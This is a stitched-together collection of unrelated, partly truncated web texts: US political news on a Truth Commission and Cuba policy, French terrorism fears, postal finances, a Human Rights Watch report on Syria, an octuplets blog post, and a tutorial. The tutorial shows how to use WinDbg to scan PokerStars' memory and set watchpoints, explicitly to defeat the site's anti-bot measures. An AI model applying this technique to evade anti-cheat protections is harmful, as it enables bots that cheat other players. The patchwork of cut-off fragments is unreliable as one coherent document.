Feingold said immunity for low - level participants of the Bush administration needed to be explored but added any Truth Commission should tread carefully in granting immunity as “ there may be some cases that should be prosecuted . ” 
He also said that Congress should only task the commission with fact - finding and not with making any recommendations .
The commission should be comprised of investigative professionals rather than partisan policymakers Feingold said .
“ It is distinctly in the public interest for this information to come out , ”  said Sen. Sheldon
Whitehouse ( D - RI ) , adding that some conduct of Bush appointees may have been so “ abhorrent ”  as to merit criminal investigations .
Cornyn said that any investigation into the interrogation methods of the CIA , would likely result in a more timid , agency , fearful of retroactive discipline , that would become reluctant to vigorously pursue intelligence gathering .
Frederick Schwartz , chief legal counsel of the Brennan Center for Justice and a witness in support of the Truth Commission , said he did n’t personally believe that CIA operatives , who engaged in questionable interrogation practices such as water boarding , should be criminally prosecuted or brought before the Truth Commission .
“ I think they acted in good faith because they had legal opinions [ backing them up ] , said Schwartz , referencing the recently made public Office of Legal Counsel memos that authorized radical and questionable executive powers .
Thomas Pickering , a former U.S. ambassador , testified in support of the commission , noting how it would improve American standing abroad with foreign allies and also take away propaganda power from terrorists who have used the treatment of prisoners in Guantanamo Bay and Abu Ghraib as a recruitment tool .
“ We must as a country take stock of where we have been and determine what is and what is not acceptable and what we will never do again , ”  Pickering said .
“ We ought to acknowledge the mistakes that were made . ” 
Pickering added that the commission should not have the power to grant blanket immunity or full immunity .
Speaking against the idea of the commission , Jeremy Rabkin , a law professor at George Mason University , objected to the statements made by some far - left sectors of society that compare President Bush and his cabinet to “ notorious war criminals of foreign countries . ” 
Rather than improving American standing abroad , Rabkin said a Truth Commission would actually legitimize these views in other countries .
Countries that have held Truth Commissions in the past , such as South Africa and Chile , had to go that route because their countries were to divided and peace to fragile to handle any kind of criminal prosecution .
“ Oh yes , that is what is done with war criminals when you ca n’t prosecute them , ”  Rabkin said .
“ I think this will be said as ratifying the background view .
If people think there should be prosecutions , there can be prosecutions . ” 
Leahy warned that if Republicans chose to not take part in his “ nonpartisan fact - finding commission , ”  then calls from more strident members of his party for criminal prosecutions of Bush administration appointees would only become louder and they would become more empowered in the eyes of the public , which according to a recent Gallup poll , two thirds of Americans support some type of inquiry into Bush administration abuses .
“ If criminal conduct occurred , this senator wants to know about it , ”  Leahy said .
“ I ’m trying to get the ability to find out if criminal conduct occurred so it wo n’t happen again .
If crimes occurred , I do n’t think they should be swept under the rug . ” 
The full formal testimony of Wednesday ’s witnesses can be read here .
Leahy tells Maddow some Republicans back legal action
During an appearance on MSNBC ’s Rachel Maddow Show , Leahy said that some Republicans might back legal action against members of the Bush White House .
Leahy told Maddow that the recently released Bush anti-terror documents “ makes me think of some of the ads I ” ˜ve seen for the Frost / Nixon tapes where the actor playing President Nixon says , ‘ It ” ˜s not against the law when the president does it . ’
Well , nobody ” ˜s above the law in this country . ' ”
Politico ’s Andy Barr writes , “ Rather than prosecuting Bush officials , the Democrat has proposed the creation of a ‘ truth commission ’ to investigate alleged wrongdoings in the waging of the war on terror .
Leahy ’s proposed commission would have subpoena power , but would not press criminal charges against former White House officials . ”
“ Now , interestingly enough , some of the Republicans , in their arguments this morning , were saying , maybe prosecution is the only way you ” ˜re going to really find out , ” Leahy said .
“ Something has been done wrong and you should have prosecution .
My feeling is , be careful what you wish for .
That may be what you get . ”
Maddow responded , “ We do have a very interesting sort of convergence of right and left on the relationship of your commission idea to prosecutions .
We got Nancy Pelosi and Russ Feingold and Sheldon Whitehouse and Michael Ratner from the Center for Constitutional Rights , all arguing they wouldn ” ˜t want any offers of immunity from the commission to preclude prosecutions . ”
“ But today , as you said , Republicans arguing against the commission , Arlen Specter , David Rivkin , former Justice Department official , both suggesting that the commission might interfere with the Justice Department ” ˜s turf in prosecuting , ” Maddow continued .
“ Are they … ”
Leahy interjected , “ That ” ˜s why I say ‘ be careful what you wish for ’ because we already have a prosecutor looking into this .
If prosecution can find all the answers , that ” ˜s fine .
But I ” ˜m just worried that it might not .
That ” ˜s why I ” ˜m trying to find this middle ground . ”
But Leahy warned Republicans , “ If we can not get the kind of bipartisan support needed for a commission to get all the facts out , then it ” ˜s going to fall back on prosecution .
But I am not willing to just ignore what happened .
Some have said turn the page .
I say , well , let ” ˜s read the page first before you turn it . ”

In How I Built a Working Online Poker Bot , Part 7 : Extracting Text from 3rd -Party Applications , we talked about how to write code to snoop on the text painted to an application 's user interface .
We noted that most applications , when they want to draw text , do so by calling one of a handful of standard operating system APIs .
And we realized that we could " detour " these APIs in memory , such that whenever an application tried to call these APIs , it would end up calling our code instead .
Our code would then have a chance to analyze the text being painted .
Several months later , one of the companies mentioned in the above - linked post — PokerStars — updated their software .
Specifically , they started painting text using a proprietary solution that does n't rely on standard operating system APIs .
Our technique stopped working , and tools which depended on it stopped working .
In PokerStars Slams Hammer on Third Party Software Industry , we can see an email PokerStars sent to tool developers .
I regret to be the bearer of bad tidings , but this was the purpose and intent of the change -- to deny malicious third party developers access to hooking ' DrawText ' to extract data from the dealer chat window .
We have completely avoided the use of ' DrawText ' and ' ExtTextOut ' in favor of a proprietary internal solution , and as such the contents of the chat cannot be extracted any longer .
While we recognize that there are many third party odds calculators and other real time tools that are absolutely not malicious and in fact are permitted on PokerStars , malicious tools such as bots and dataminers also retrieve their data in the same manner , and it is against those developers that such measures are designed .
While unfortunate , some permitted apps are likely to be hobbled by the changes intended to prevent cheating , and there 's little that we can offer you in way of a solution or a way around this .
We can't offer you an API to the data ( or malicious developers would hack it ) , and we can't go back to using DrawText .
We believe it more important to keep the malicious programs out than it is to allow permitted programs to continue to function .
I wish I had a solution for you , but the truth is that additional changes will be forthcoming to make it even more difficult to gather " real time data " from the client as well .
If a cheating program manages to find a way to code around these changes , we 'll plug whatever hole they exploit as well ( which may well break any solution you come up with for your applications as well ) .
I wish I had better news for you , but that is PokerStars ' position on the gathering of real time data from the client .
All I can offer is apologies that your application had to be caught up as " collateral damage " in the war on cheating applications .
Just to be clear , the issue here is that online poker tool developers have been programatically extracting text from the PokerStars game chat window .
This window gives crucial information about the betting actions in each game .
The text contained in this window is not private in any way — it 's intended for human consumption — but PokerStars would prefer that third - party software tools not have access to it .
In their view , that capability makes it too easy for malicious software to hook into the PokerStars client .
So they 've taken steps to prevent it .
But is the PokerStars game chat text truly gone , such that it can never be extracted ?
Or is it merely hiding ?
In order to answer that question , let 's download a powerful but free piece of software called WinDbg , the core member of the Debugging Tools for Windows package .
Here it is , in all its glory :
Most programmers who were weaned on a diet of Visual Studio development rarely , if ever , use any debugger other than the built - in Visual Studio debugger .
That 's usually okay because the Visual Studio debugger is integrated , eloquent , easy to use , and quite powerful .
But there are many debugging facilities which are n't exposed through the Visual Studio debugger UI .
Once you 've installed WinDbg , you should really take the time to configure your symbol files properly .
But this is n't strictly necessary for today 's work .
Let 's choose the " Open Executable " option from the File menu :
Browse to the PokerStars executable :
A WinDbg command window will open .
We 'll see messages for each of the DLLs loaded by the target application , then a " break instruction " followed by the context ( the state of the CPU registers ) of the primary thread .
By default , when we launch an application through WinDbg , it opens the application in a state of suspended animation .
That is , it invokes the application and then immediately halts it .
When the target application is in this state , you can't interact with it in any way ( except , of course , through the debugger ) .
So let 's type g into the WinDbg command prompt ( or use the toolbar button ) in order to wake PokerStars up and give it a chance to run .
The PokerStars main window should appear , and we 'll see some more messages stream into the WinDbg command window .
Then we 'll open one or more PokerStars tables , and let them run for a couple minutes , in order to accumulate some text in the game chat window .
After that , it 's time to " break into the target " as we say .
Hit the WinDbg Break button on the toolbar .
The PokerStars application will freeze .
Now , I should mention that every game - related message in the PokerStars chat window is prefaced with the following phrase :
Dealer :
For the purposes of this experiment , we 'll use that as a quick and dirty way of locating these game chat messages in memory .
In other words , we want to scan the entire PokerStars process — all of it — for the above phrase .
In order to that , we 'll execute the following command :
s -u 0x00000000 L?0 xffffffff " Dealer : "
Loosely translated , this says : search , starting at memory location 0x00000000 , and ending at memory location 0xFFFFFFFF , for all instances of the Unicode text phrase " Dealer : " in the PokerStars process .
( We can tell WinDbg to search for ASCII text by replacing the " - u " with " - a " . )
Type that into the WinDbg command window and voila !
As you can see , there are numerous instances of this text in PokerStars process memory — one for each line of text in the game chat window , in fact , plus a few occasional duplicates .
For those of you who are new to " hex editor UI , " let 's look at it with some helpful annotations :
Each line corresponds to a specific memory address whose bytes , when interpreted as Unicode text , spell out our catchphrase .
Clearly , the PokerStars chat text still exists , the same as it ever did .
But let 's take a closer look .
Open a Memory window from the menu or by hitting Alt+5 :
This will let us examine the actual bits and bytes of process memory .
At the top of the window , in the field labeled " Virtual , " we 'll plug in the address of one of the " Dealer : " text strings shown above .
( The strings inside the red box .
Do n't use the actual values shown above ; use the values returned by your copy of WinDbg ) .
We are now staring at the bits and bytes of a single line of text from the PokerStars game chat window .
So when PokerStars says that game text " can no longer be extracted " we should take that statement , as always , with a grain of salt .
Extra Credit : Watchpoints
Most programmers are familiar with the concept of a breakpoint .
When we 're debugging an application , and execution reaches a breakpoint , the debugger breaks into the application and gives us a chance to start single - stepping through it , examining variables and so forth .
Most programmers eventually learn that we can set conditional breakpoints .
Instead of halting the application when a particular breakpoint is reached , conditional breakpoints halt the application when a particular condition is true .
For example , " break if the value of foo is 93 " .
But relatively few programmers are aware of data breakpoints , also known as watchpoints .
These tell the debugger to halt the application not when a particular piece of code is executed , but when a certain memory address is accessed .
In any way whatsoever .
For example , if we happen to know that a certain piece of text is sitting in process memory at a certain address , and we want the debugger to tell us whenever that piece of text is passed into a function , copied , or deallocated , we can create a watchpoint .
Within WinDebug , the ba command ( " break on access " ) is used to set up a watchpoint .
For example :
ba r4 0x04EFF210
This command reads break the application whenever the 4 - bytes of memory starting at address 0x04EFF210 are accessed .
Sounds good , except that breakpoints are usually set in the context of a specific thread , and PokerStars , like most applications nowadays , has multiple threads :
So what we want to do is somehow set the data breakpoint across all threads .
Lo and behold , WinDbg allows us to do that by using a special prefix :
~* ba r4 0x04EFF210
The ~* instructs WinDebug to set the breakpoint across all ( * ) threads .
We could also use it to set the breakpoint for specific threads .
Let 's go ahead and type the above command into the WinDbg command line , replacing the address 0x04EFF210 with one of the addresses returned when you executed the s command above .
Once we 've done that , type g to resume the application .
If we 've timed things correctly , the breakpoint should be hit almost immediately .
We 'll continue typing g to resume the application each time the breakpoint is hit and we 'll end up with output similar to the following :
At this point , we 've learned two things :
Where text exists inside the PokerStars ( or other application ) process .
The state of the process , including all threads , stack frames , and registers , each time this text is accessed .
We know what the text is , and with some careful research , we can figure out what functions are accessing this text .
In order to do that , we can examine the call stack each time the debugger halts the application : " Breakpoint 0 hit . "
We can then work backwards , and start to determine which functions are responsible for creating , reading , and copying PokerStars game chat messages , as well as the structure of those messages in process memory .
Without ever knowing the name of any of these functions or structures .
Once those functions are identified , we can start to interposition custom code in order to redirect execution flow from the original versions of those functions to custom code , written by us ... giving us a chance , once again , to read PokerStars game text in real time .
That 's just one way of doing it .
There are others .
And of course , PokerStars is just an example .
The above technique will work with any Windows application , although , as always , some tweaking is required .
Stay tuned and we 'll discuss some of the details and , after a three month hiatus , take a look at some more source code .
Happy disassembling .
NASA ’s STEREO spacecraft will search for objects trapped at the Lagrangian points ( Image : Johns Hopkins University Applied Physics Laboratory / NASA )
THEY are the places gravity forgot .
Vast regions of space , millions of kilometres across , in which celestial forces conspire to cancel out gravity and so trap anything that falls into them .
They sit in the Earth ’s orbit , one marching ahead of our planet , the other trailing along behind .
Astronomers call them Lagrangian points , or L4 and L5 for short .
The best way to think of them , though , is as celestial flypaper .
In the 4.5 billion years since the formation of the solar system , everything from dust clouds to asteroids and hidden planets may have accumulated there .
Some have even speculated that alien spacecraft are watching us from the Lagrangian points , looking for signs of intelligence .
Putting little green men to one side for the moment , even the presence of plain old space rocks would be enough to keep most people happy .
“ I think you certainly might find a whole population of objects at L4 and L5 , ” says astrophysicist Richard Gott of Princeton University .
After nearly a century of speculation , we are on the verge of finding out what they are hiding once and for all .
Later this year , two spacecraft that spend their lives studying the sun will begin their slow journeys through L4 and L5 .
Space scientists plan to use instruments on board NASA ’s STEREO probes A and B to search for celestial objects becalmed at the Lagrangian points .
What they find could hugely enhance our view of how the solar system formed , tell us more about …
A new study of 38,000 Americans has found that 95 percent had premarital sex , challenging the wisdom of the abstinence - only sex education programs favored by the Bush administration .
According to the study ’s author : “ It would be more effective … to provide young people with the skills and information they need to be safe once they become sexually active — which nearly everyone eventually will . ”
The study also determined that engaging in premarital sex to be fairly consistent from the 1950s on , refuting the claim that people were simply less sexually active before marriage in the good old days .
The French government fears a wave of extreme left - wing terrorism this year with the possible sabotage of key infrastructure , kidnappings of major business figures or even bomb attacks .
Secret French government reports , seen by the Observer , describe an " elevated threat " from an " international European network ... with a strong presence in France " after the radicalisation of " a new generation of activists " in recent years .
Senior analysts and experts linked to the government have drawn parallels with the Action Directe group , which carried out 50 or more attacks in the early 1980s .
Others cite the example of the Baader - Meinhof gang .
A report by the French domestic intelligence service talks of " a rebirth of the violent extreme left " across Europe that is likely to be aggravated by the effects of the economic crisis .
Other secret documents expose alleged links with activists in Italy , Greece , Germany and the UK .
" It has been growing for three or four years now and the violence is getting closer and closer to real terrorism , " said Eric Dénécé , director of the French centre of intelligence research and a former Defence Ministry consultant .
While some believe such claims to be scaremongering , the present political atmosphere is tense , with many among right - wing President Nicolas Sarkozy 's aides fearing a repeat of the violence in Athens last month , when angry and alienated young people and a hard core of violent left - wing extremists rioted for several days , causing significant damage and bringing the city to a halt .
Last week hundreds of fly - posters around Paris called on young people " forced to work for a world that poisons us " to follow the example of their Greek counterparts .
" The insurrection goes on .
If it takes hold everywhere , no one can stop it , " the posters said .
The recent intelligence reports have blamed violent demonstrations against changes in employment law in 2006 , often by middle - class young people , for the recruitment of large numbers of new activists .
A series of incidents last year confirmed the fears of French police .
In January two activists were arrested in possession of what was alleged to be bomb - making materials .
In November nine people were arrested after a lengthy surveillance operation in the central French village of Tarnac , where they had set up a commune .
Two of the alleged ringleaders , Julien Coupat , 34 , and his partner Yildune Lévy , 25 , are still in prison accused of sabotaging high - speed TGV railway lines and " associating with wrongdoers with terrorist aims " .
Gilles Gray , assistant director of economic protection of the French domestic intelligence service , spoke recently of " a philosophy that was spreading in Europe " .
The arrests in Tarnac were " a strong message ... addressed to those who might be thinking about committing similar acts , " he said .
" We hope that this affair has put a stop for a time to this kind of violent action [ and will avoid ] a return of Action Directe . "
Investigators believe that the arrests at Tarnac provoked " reprisals " in Athens , where the offices of the French news agency Agence France - Presse were attacked with makeshift incendiary devices , and in Hamburg , where the French consulate was daubed with paint .
A claim of responsibility for the sabotage of the TGV lines was , police say , sent to a German newspaper from Hanover and signed " those who have had enough ... in memory of Sébastien " , believed to be a reference to Sébastien Briat , a young anti-nuclear militant crushed by a nuclear waste train in eastern
France exactly four years before the night of the recent spate of sabotage .
Coupat and Lévy had taken part in demonstrations and actions in Germany , the US and the UK .
Coupat has also been accused by investigators of anonymously writing a book , The Coming Insurrection , published by a little known Paris publishing house in 2007 .
The book , which has been translated into English and posted on US and UK anarchist websites , was found in the possession of three young activists arrested after detonating a bomb in a field .
It contains instructions about sabotaging railways and other means of " destroying the power of the police , seizing local political power by the people , and blocking the economy " .
A statement from the publishing house said the author was " a committee from the subversive tendency " .
But some accuse France 's right - wing government of both exaggerating and exploiting the left - wing threat .
" They are turning my son into a scapegoat for a generation who have started to think for themselves about capitalism and its wrongs and to demonstrate against the government , " said Gérard Coupat , father of the alleged ringleader of the Tarnac group .
" The government is keeping my son in prison because a man of the left with the courage to demonstrate is the last thing they want now , with the economic situation getting worse and worse .
Nothing like this has happened in France since the war .
It is very serious . "
Author and researcher Christophe Bourseiller told the Observer the threat was being exaggerated .
" Yes , there is a certain renewed level of agitation , but there is a huge difference between deliberately slowing down a few trains without injuring anyone and something like the Madrid bomb blasts , " he said .
" The Ministry of the Interior has made it look like the Tarnac arrests halted a serious campaign of violence with a huge , huge media operation . "
Certainly there is a widespread fear at the ministry in the Place Beauveau of violent protests in the coming months .
A powerful and growing movement among schoolchildren forced the tactical withdrawal of wide - ranging reform plans after demonstrations in Lyon led to clashes with the police , mass arrests and the burning of cars .
Trade unions have promised a series of mass stoppages in the coming months .
Among a population already made bitter by static salaries , rising prices and structurally high levels of unemployment , the lay - offs and wage cuts that could result from the economic crisis will fuel anger .
" Whether or not the Tarnac group is guilty , there are other groups in France , in Italy , in Germany , which , having lost faith in a political left in disarray , are tempted by violent action and are in a phase of semi- clandestinity , " Alain Bauer , a criminologist at the Sorbonne , told the Observer .
" With Action Directe and the Red Brigades , there was a first intellectual phase , followed by a radicalisation and then a transition to physical action .
Books like The Coming Insurrection are strongly reminiscent of the first phase . "
Other similarities include the tactics envisaged and the middle - class , educated profile of most of the activists .
NEW YORK ( CNNMoney.com ) --
The U.S. Postal Service may be forced to eliminate a day of mail service because the economic downturn has led to plummeting volume and revenue , the postmaster general said Wednesday .
Postmaster General John E. Potter , in testimony before a Senate subcommittee , warned of a possible worst - case scenario : eliminating the requirement to deliver mail six days a week to every address in America .
If the recession continues to hammer at USPS revenue , six - day delivery may not be possible , Potter said .
Federal law has mandated the six - day schedule since 1983 .
In fiscal 2008 , total mail volume fell by more than 9 billion pieces - 4.5 % - compared to the previous year , Potter said .
And the agency suffered a greater - than - expected net loss of $ 2.8 billion last year , he added .
" The real problem is that the Postal Service needs reform , " said Michael A. Crew , professor of regulatory economics at Rutgers University , whose 2009 book " Handbook of Postal Reform " argues for USPS privatization .
" The Postal Accountability and Enhancement Act of 2006 was supposed to make the agency competitive and bring regulations into the 21st century , " Crew added .
" But it just painted over the cracks , and they 're still struggling . "
USPS is " a vital economic engine in our national economy , " Potter said , noting that USPS is the country 's second - largest employer and the mail affects both jobs and commerce .
" We could experience a net loss of $ 6 billion or more this fiscal year , " Potter told the subcommittee .
That shortfall would exceed the Postal Service 's credit limit under current law .
" We believe that legislative relief is necessary to preserve the nation 's mail system , " Potter said .
Could a five - day schedule kill demand ?
But cutting a day of delivery is just one option , and it may not be the most beneficial one , Crew said .
" Six - day delivery is much more attractive than five days , " he said .
" If that change affects demand , it could hurt volume even more . "
Still , Crew noted the postal systems in other countries like Canada already operate on a five - day schedule .
Another option : Instituting the abbreviated schedule in the high - cost rural areas and maintaining six days in high volume areas , instead of cutting a day across the board , Crew said .
Health benefits
Potter also asked Congress to change the payment schedule for funding its retirees ' health benefits .
In 2008 , total retiree health benefits costs came to $ 7.4 billion - almost 10 % of the annual operating budget , he said .
The Postal Law of 2006 requires accelerated prepayment of future retiree health care costs .
USPS " is the only public or private entity required to prepay health benefit premiums at these extremely high levels , " Potter said .
Potter said a modified schedule of payments would allow USPS to focus on its financial problems .
The proposed change would neither increase the health benefit premiums paid by current or future USPS retirees , nor would it affect their benefits , he said .
Crew predicted USPS will receive help with their " ambitious schedule . "
USPS has tried to cut operating costs over the last few years , Potter said , but the recent decline in economic conditions is too steep for the agency to be able to respond .
He added the agency has reduced its work force by more than 120,000 employees since 2002 .
" Many people are getting bailouts now , so who knows ? "
Crew said .
" Even if it 's not everything USPS is asking for , I think they will get some type of relief . "
( New York ) - Syrian authorities should abolish the Supreme State Security Court ( SSSC ) , a special court that exists outside the ordinary criminal justice system to prosecute those perceived as challenging the government , Human Rights Watch said in a report released today .
In the 73 - page report , " Far from Justice : Syria 's Supreme State Security Court , " Human Rights Watch documents how the SSSC has relied on sham trials to prosecute at least 153 defendants since January 2007 on the basis of vague charges that criminalize freedom of expression .
Those prosecuted include 10 bloggers , 16 Kurdish activists , and eight citizens accused of " insulting the Syrian president " in private conversations .
The report is based on interviews with former defendants before the SSSC , their lawyers , and human rights activists in Syria , as well as an extensive review of trial notes taken by Western diplomats , who are the only outside observers to have had access to the court .
Human Rights
Watch has extensively compiled information on the trials of and charges against 237 detainees , representing all cases known to have been decided by the SSSC between January 2007 and June 2008 , and analyzed the charges brought in these cases , the categories of detainees prosecuted , the administration of justice at their trials , and their terms of sentencing .
" The State Security Court is one of Syria 's main pillars of repression , " said Sarah Leah Whitson , Middle East director at Human Rights Watch .
" It 's a kangaroo court providing judicial cover for the persecution of activists , and even ordinary citizens , by Syria 's security agencies .
Defendants have no chance of defending themselves , much less proving their innocence against the bogus charges brought against them . "
By decree , the SSSC is exempt from the rules of criminal procedure that apply in Syria 's criminal courts .
Defense lawyers play a largely ceremonial role in a charade of due process .
They usually see their clients for the first time on the day of the trial and the court denies them the opportunity to engage in oral defense or call on witnesses .
Most trials consist of four short sessions , often less than 30 minutes each .
Defendants have no right to appeal their verdict to a higher tribunal .
Human Rights
Watch found that security forces detain defendants scheduled to appear before the SSSC for long periods of time - usually for months - before informing them of the charges against them .
Defendants frequently allege that Syrian security services tortured them to extract their confessions , but the court does not investigate the allegations or reject the confessions .
The SSSC sentenced the vast majority of defendants who appeared before it during the 18 - month period from January 2007 to June 2008 on the basis of its vaguely defined , overbroad " security laws , " most typically the charge of " spreading false or exaggerated information that weakens national sentiment . "
" In the name of protecting ‘ national sentiment , ' the SSSC jailed more than 100 people last year , " Whitson said .
" It is not these defendants who weaken national sentiment , but the practices used by the Syrian state to silence them . "
Since 1992 , when it resumed its activities after a hiatus in the 1980s , the SSSC has tried thousands of people .
The largest category of defendants before the SSSC in the last three years includes those labeled as " Islamists " ; their chief " crime " appears to be that many possess CDs or books by fundamentalist clerics .
The SSSC has also tried Kurdish activists , bloggers , writers , and private citizens , like Muhamad al - Husseini , 67 , whom the SSSC sentenced to three years in jail in 2007 because the security services reportedly overheard him " insulting the Syrian president " and criticizing corruption in Syria while sitting at a popular cafe in Damascus .
In one case , the government prosecuted a Syrian citizen after informants said he had insulted President Bashar al - Asad while watching television at his uncle 's home .
" It appears that ordinary Syrians who are n't engaged in any political activity cannot have a private conversation , exchanging opinions about their government , in a restaurant or even in their own homes , " said Whitson .
" Instead of addressing the country 's genuine problems of poverty , corruption , and a stunted political environment , the Syrian authorities expend national resources spying on their own people . "
The European Union and the United States have been eager to engage with Syria recently .
Human Rights
Watch urged these governments to communicate their strong disapproval of the SSSC and to condition any further progress in their relations with Syria - notably the entry into force of the Association Agreement between Syria and the European Union - on abolition of the SSSC and concrete improvements in Syria 's human rights situation .
Human Rights
Watch also called on the Syrian authorities to :
Abolish the court and create an independent judicial commission to review the existing cases before the SSSC ;
Order the release of defendants facing prosecution solely for exercising their freedom of expression or association ; and
Transfer to regular criminal court those cases where there is probative evidence that the defendant committed recognizable criminal offenses .
The report also urged Syria to decriminalize free expression and peaceful association by revising the vague and overbroad statutes in the penal code that the authorities use to prosecute individuals for speaking their minds or holding a meeting .
The SSSC suspended its operations starting in July 2008 following a riot that broke out at Sednaya prison , which the authorities quelled violently .
The government detains the vast majority of detainees on trial before the SSSC at Sednaya prison .
The SSSC did not issue any explanation for the suspension of hearings , but it is likely linked to the total blackout on information concerning detainees in Sednaya prison that Syrian authorities imposed following the riot .
Human Rights
Watch urged the Syrian authorities to make permanent this temporary suspension and to release information on the fate of the detainees in Sednaya .
Accounts from " Far From Justice " :
A defendant described the torture that he endured at the Political Security branch during investigation in 2003 .
The judge at the SSSC used his confession to convict him at trial :
" The investigation began .
It involved beatings and more beatings . [...]
The investigation lasted for 12 days : two sessions of beatings per day .
They beat me on the bottom of my feet , on my head .
After 20 days in detention , they took me to an office and told me to sign my confession .
I said , ‘ I want to read it . '
I was beaten again , forced to thumb print the confession and sign .
I never managed to read it . "
A Kurdish university student , whom the SSSC sentenced to two - and - a - half years in prison for writing an article criticizing the treatment of Kurds , described his trial :
" The whole thing lasted three sessions .
My first session was for 30 minutes .
This was the first time I saw my lawyer .
The judge read the article I wrote during the session and asked me a few questions .
This was the only time I spoke during the trial .
He told me that I did not understand anything , and my facts on the repression of Kurds were all wrong .
The second session was supposed to be my defense session .
My lawyer had prepared a statement arguing that I should be amnestied like other Kurds detained after the Qamishli events .
I refused that defense because I wanted to defend my article and asked for the session to be postponed .
However , I never had a chance to present that defense , as I was sentenced during the third session .
The judge said that my article ‘ had incited the Kurds to fight . '
I had written it after the end of the fighting . "
A Western diplomat who has attended numerous SSSC trials described the court sessions :
" What strikes you is that it does not look or feel like a real court .
It is in a room of a house with the judge sitting behind a desk .
The judge usually makes a short summary of the case , asks a few questions to the defendant and then the session is over .
The defense lawyers never speak , and I have never seen any physical evidence presented .
The whole session does not last more than 30 minutes per group [ of defendants ] . "
A Western diplomat who has frequently attended the SSSC proceedings provided his impressions of the president of the SSSC , judge Fayez al - Nuri :
" I have never seen al - Nuri really look at a file .
He basically tells the defendant , ‘ this is the charge , what do you have to say ? '
As the defendant speaks , he may suddenly say , ‘ enough ! '
The prosecutor never asks questions .
He might add a comment or share a joke with al - Nuri . "
A defense lawyer who regularly appears before the SSSC described the court 's reliance on confessions obtained under torture :
Being on the Net almost daily searching for new content , I regularly stumble upon game - based fan - created films , and most of the time , they suck real bad .
But once in a while , I end up on a real gem , something that just WOWs me with its polish and originality .
This is certainly the case with “ The Craft of War : Blind ” .
This fan - made short has been produced using the World of Warcraft universe and is supposed to be the first episode in a series of many .
Let ’s just hope that the author will keep his word and produce many other ones like this !

Now , I am not against having families even large ones but this story just does n't add up .
From this article , she has six other kids at home with her parents , where SHE LIVES .
There is no mention of a husband , boyfriend , significant other plus she was taking fertility medication and had the embryos implanted .
The woman is very young and has kids at home who are 7 , 6 , 5 , 3 and 2 year old twins .
Now what is up with this picture ?
Again , folks do what they want , but many people who have 7 , 8 babies do expect the public to just shower them with freebies , sorry that has been the habit in the past .
In this case , a very young , possibly unmarried mother with 6 kids already and then purposely have multiple more ?
There is just too much more to this story .
Especially from the response of her father :
Within hours , media had camped out at the family 's home in Whittier , where the babies ' grandfather pulled up in a minivan in the evening and briefly spoke to The Associated Press .
Beside him were two children — a 7 - year - old and 6 - year - old — who said they were excited to have eight new siblings .
But the grandfather warned that media may have a tougher time finding the family after the babies are released from the hospital .
" We have a huge house , not here , " said the man , who would only identify himself as Ed .
" You are never going to know where it is . "
Angela Suleman told The Associated Press she was not supportive when her daughter , Nadya Suleman , decided to have more embryos implanted last year .
" It ca n't go on any longer , " she said in a phone interview Friday .
" She 's got six children and no husband .
I was brought up the traditional way .
I firmly believe in marriage .
But she did n't want to get married . "
Nadya Suleman , 33 , gave birth Monday in nearby Bellflower .
She was expected to remain in the hospital for at least a few more days , and her newborns for at least a month .
A spokeswoman at Kaiser Permanente Bellflower Medical Center said the babies were doing well and seven were breathing unassisted .
While her daughter recovers , Angela Suleman is taking care of the other six children , ages 2 through 7 , at the family home in Whittier , about 15 miles east of downtown Los Angeles .
She said she warned her daughter that when she gets home from the hospital , " I 'm going to be gone . "
Again , everyone can make their own conclusions , but for me , MORE TO THE STORY .
Confirmed .
Mother unmarried and obsessed with having children .
All of her kids were through in - vitro .
Monday ’s call by Sen. Richard Lugar for a major reassessment of Washington ’s nearly half - century effort to isolate Cuba increases the likelihood that U.S. President Barack Obama will make substantial changes in policy toward Havana beyond those he promised during his election campaign , according to experts .
" What ’s significant is that this is the senior statesman for foreign policy in the Republican Party , someone who does n’t have a long track record of advocating for changes in Cuba policy , who has decided to come out and really put his stamp on this issue by saying that the U.S. embargo does n’t favor our national interest , " said Daniel Erikson , a Cuba specialist at the Inter - American Dialogue , a think - tank .
" The fact is that Lugar has preempted Obama with his own proposals for changing the policy and in so doing creates a context that is much more favorable to changing the policy beyond the narrow of issue of lifting restrictions on Cuban - American travel and remittances " to the island , added Erikson , author of The Cuba Wars , a recently published book on U.S. - Cuban relations .
" What you are seeing is momentum - building , " agreed Geoff Thale , a Cuba specialist at the Washington Office on Latin America ( WOLA ) , a human rights group that has long opposed the trade embargo .
" With the policy already under review by the administration , Lugar is creating political space for Obama to take stronger action than he otherwise might . "
In an introduction to a staff report he released Monday , Lugar , the ranking Republican and former chairman of the Senate Foreign Relations Committee , said Washington " must recognize the ineffectiveness of our current policy and deal with the Cuban regime in a way that enhances U.S. interests . "
" After 47 years the unilateral embargo on Cuba has failed to achieve its stated purpose of ‘ bringing democracy to the Cuban people , ’ " Lugar wrote , " while it may have been used as a foil by the regime to demand further sacrifices from Cuba ’s impoverished population , " he noted , adding that the report , entitled " Changing Cuba Policy  In the United States ’ National Interest , " " provides significant insight and a number of important recommendations to advance U.S. interests with Cuba . "
The report itself , published on the first anniversary of the transfer of power from former President Fidel Castro to his brother , Raul , and based in part on four - day trip to Cuba by a staff delegation last month , called for the resumption of bilateral talks on drug interdiction and migration , enhanced cooperation on alternative energy development , and easing restrictions on travel and trade .
It also urged Havana ’s reintegration into western - dominated international institutions , such as the World Bank and the Inter - American Development Bank , among other steps Washington could take as part of process of " sequenced engagement " designed to " develop trust " between the two nations .
Lugar ’s statement and the report ’s release come amid growing speculation among Cuba specialists regarding the new administration ’s intentions .
During the presidential campaign , Obama had promised to lift restrictions imposed by former President George W. Bush in 2004 on the freedom of Cuban Americans to travel to the island and to send money to their families there .
He also indicated , however that he would retain the trade embargo as leverage to encourage political and democratic reform .
During her confirmation hearings , Secretary of State Hillary Clinton , who had taken a harder line on the embargo during her primary campaign against Obama , said the administration would conduct a review of Cuba policy , but , one month after his inauguration , key officials who would be expected to oversee such a process  including the likely assistant secretary of state for Western Hemisphere affairs , Georgetown University professor Arturo Valenzuela , and his counterparts on the National Security Council  are not yet in place .
Nonetheless , Obama is expected to formally lift the Cuban - American - related curbs before the scheduled Summit of the Americas in Trinidad in mid-April , and possibly by mid-March .
Some observers believe he will combine that move with lifting other curbs on travel , including educational and cultural exchanges that brought thousands of U.S. citizens to the island in the late 1990s , and trade , notably requirements that Cuba pay in cash in advance for agricultural imports from the U.S. , imposed by Bush .
" I think he will go beyond the Cuban - American curbs and at least go back to the circumstances [ that prevailed ] at least at the end of the [ Bill ] Clinton administration , " said William LeoGrande , a Cuba specialist and dean of the School of Government at American University .
